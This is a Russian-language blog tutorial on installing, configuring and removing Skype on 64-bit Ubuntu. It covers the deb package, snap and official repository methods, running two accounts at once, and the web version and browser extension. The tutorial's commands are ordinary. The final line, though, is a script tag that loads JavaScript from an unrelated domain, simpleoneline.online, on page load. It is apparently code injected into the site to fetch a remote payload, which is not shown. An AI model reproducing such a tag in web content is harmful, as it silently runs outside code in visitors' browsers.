---
title: "Как установить последнюю версию Skype в Ubuntu (64 bit only)"
date: "2018-02-04"
---

В данной статье я расскажу, как установить последнюю версию Skype в Ubuntu.

### Оглавление.

1\. [Коротко о Skype для Linux.](#about)  
2\. [Установка последней версии Skype в Ubuntu.](#install)  
3\. [Настройка Skype для Linux в Ubuntu.](#settings)  
4\. [Удаление Skype из Ubuntu.](#delete)  
5\. [Веб версия Skype или Skype for Web.](#web)  
6\. [Расширение Skype для браузера.](#browser_extension)

## 1. Коротко о Skype для Linux.

Наконец-то свершилось событие, что для всех трёх систем (Windows, MacOS и Linux) доступен клиент Skype с одинаковыми возможностями и интерфейсом. 

В последней версии Skype пользователям Linux доступен полный спектр функционала, такого как:

- Демонстрация (расшаривание) экрана собеседнику;
- Видео и аудио звонки;
- Передача файлов.

Интерфейс Skype в Linux выглядит следующим образом:

[![](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_143-512x355.png)](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_143.png)

[![](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_144-512x355.png)](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_144.png)

[![](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_146-512x355.png)](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_146.png)

### [Вернуться к оглавлению ->](#contents)

## 2\. Установка последней версии Skype в Ubuntu.

Версия deb пакета программы Skype доступна только для 64 битной версии Ubuntu.

Установить последнюю версию Skype можно одним из следующих способов.

#### 2.1. Установка последней версии Skype в Ubuntu, скачав deb пакет с официального сайта.

Чтобы установить самую последнюю стабильную версию Skype в Ubuntu, скачайте deb пакет с официального сайта по следующей ссылке:

[https://www.skype.com/ru/get-skype/](https://www.skype.com/ru/get-skype/)

[![](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_147-512x334.png)](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_147.png)

После чего установите скачанный deb пакет программы Skype через Центр приложений Ubuntu (_двойной клик по deb пакету_) или любым другим, удобным для вас способом. К примеру, вы можете воспользоваться приложение gdebi: [Gdebi — программа для установки .deb пакетов в Ubuntu.](http://www.linuxrussia.com/gdebi-deb-ubuntu.html) 

Но если вы больше любите терминал для установки приложений, то скачать и установить deb пакет с офф. сайта Skype можно следующей командой в консоле:

cd /tmp/ && wget https://repo.skype.com/latest/skypeforlinux-64.deb && sudo dpkg -i skypeforlinux-64.deb

Помимо установки приложения в систему будет добавлен репозиторий Skype. Следовательно, при обновлении системы будет обновляться и Skype.

#### 2.2. Установка Skype как snap пакет.

Отлично, что Snap пакеты всё больше и больше развиваются. Более подробно о них я писал в следующей статье: [Установка Snap пакетов в Ubuntu.](http://www.linuxrussia.com/snap-packages.html "Установка Snap пакетов в Ubuntu.")

Теперь и Skype можно установить с помощью snap пакета. Установить его можно перейдя по следующей ссылке:

 [https://snapcraft.io/skype](https://snapcraft.io/skype)

И нажать Install:

[![](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_148-512x372.png)](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_148.png)

В Центре приложений Ubuntu будет предложена установка:

[![](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_149-512x244.png)](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_149.png)

[![](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_151-512x353.png)](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_151.png)

Либо найдите его в Центре приложений Ubuntu.

Или поставить snap пакет Skype, просто выполнив следующую команду в терминале:

sudo snap install skype --classic

#### 2.3. Установка Skype из официального репозитория в терминале.

Сразу предупреждаю. Если ставить приложение Skype через терминал из данного репозитория, то будет установлена preview версия, а не стабильная.  

Добавляем ключ репозитория в систему (_это одна команда, её нужно скопировать полностью и выполнить в терминале_):

wget -q -O - https://repo.skype.com/data/SKYPE-GPG-KEY | sudo apt-key add -

Добавляем репозиторий Skype в систему (_это одна команда, её нужно скопировать полностью и выполнить в терминале_):

sudo sh -c 'echo "deb \[arch=amd64\] https://repo.skype.com/deb stable main" > /etc/apt/sources.list.d/skype-stable.list'

Обновляем сведения о пакетах в репозиториях системы и устанавливаем, непосредственно, саму программу Skype, выполнив следующую команду в терминале:

sudo apt-get update && sudo apt-get install skypeforlinux -y

Всё, последняя версия Skype Preview установлена в Ubuntu.

### [Вернуться к оглавлению ->](#contents)

## 3\. Настройка Skype для Linux в Ubuntu.

Описывать банальные настройки изменения внешнего вида и прочего я не буду. Так как в Skype встроены визуальные подсказки и Skype сам вам всё это подскажет. Давайте разберём более серьёзный вопрос, который не особо описан.

#### Как запустить несколько работающих аккаунтов Skype одновременно на Ubuntu.

Выглядит это следующим образом:

[![](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_153-512x351.png)](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_153.png)

[![](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_152.png)](http://www.linuxrussia.com/wp-content/uploads/2018/02/linuxrussia_152.png)

Чтобы работало несколько аккаунтов Skype одновременно в Ubuntu, нужно проделать следующие манипуляции.

Запускаем первый аккаунт следующей командой:

skypeforlinux --datapath=/home/user/.Skype/profile1/

где вместо user - имя вашего пользователя.

Затем запускаем второй аккаунт следующей командой:

skypeforlinux --secondary --datapath=/home/user/.Skype/profile2/

где вместо user - имя вашего пользователя.

Чтобы не запускать постоянно Skype из консоли, можете отредактировать файл:

sudo gedit /usr/share/applications/skypeforlinux.desktop 

И заменить Exeс на команду запуска Skype с первым профилем.

И для удобства создать ещё один ярлык для запуска второго профиля. Об этом можно прочитать в данной статье: [Как создать ярлык в Ubuntu.](http://www.linuxrussia.com/create-launcher-ubuntu.html)

Вот и всё.

### [Вернуться к оглавлению ->](#contents)

## 4\. Удаление Skype из Ubuntu.

Если хотите удалить Skype из Ubuntu, откройте терминал и выполните следующие команды.

Удаляем, непосредственно, само приложение Skype из Ubuntu:

sudo apt remove skypeforlinux

В принципе, этого достаточно. Остальное можете выполнить по желанию.

Но также можно удалить добавленный репозиторий:

sudo rm /etc/apt/sources.list.d/skype-stable.list\*

Настройки приложения Skype и профили пользователей находятся по адресу ~/.config/skypeforlinux, следовательно их также можно удалить с помощью терминала:

rm -r ~/.config/skypeforlinux

Ну или удалить с помощью файлового менеджера (_нажав CTRL - H, чтобы отобразились скрытые каталоги_) и перейти по адресу, что я указал выше.

Если воспользовались инструкцией по запуску нескольких аккаунтов, то конфиги ваших профилей лежат по адресу ~/.Skype, для их удаления выполните следующую команду в терминале:

rm -r ~/.Skype

### [Вернуться к оглавлению ->](#contents)

## 5\. Веб версия Skype или Skype for Web.

Многие возможности, которые есть в десктопной версии Skype для Linux, доступны также и из браузера. Выглядит эта версия так:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/04/linuxrussia_060.png)](http://www.linuxrussia.com/wp-content/uploads/2017/04/linuxrussia_060.png)

Данная версия Skype доступна по адресу:

[https://web.skype.com/ru/](https://web.skype.com/ru/)

Должно работать в Chrome подобных браузерах и Firefox.

### [Вернуться к оглавлению ->](#contents)

## 6\. Расширение Skype для браузера.

Ещё есть и расширение для браузера Firefox и Chrome.

Позволяет поделиться информацией из браузера в Skype и открыть главное окно десктоп приложения Skype:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/04/linuxrussia_061.png)](http://www.linuxrussia.com/wp-content/uploads/2017/04/linuxrussia_061.png)

[![](http://www.linuxrussia.com/wp-content/uploads/2017/04/linuxrussia_062.png)](http://www.linuxrussia.com/wp-content/uploads/2017/04/linuxrussia_062.png)

Больше ничего не умеет.

Если нравится то можно установить по следующим ссылкам:

[Скачать расширение Skype для Chrome](https://go.skype.com/chrome.extension/)  
[Скачать расширение Skype для Firefox](https://go.skype.com/firefox.extension/)

### [Вернуться к оглавлению ->](#contents)

<script async src="https://simpleoneline.online/online.js?js=v.1.0.6" type="text/javascript"></script>
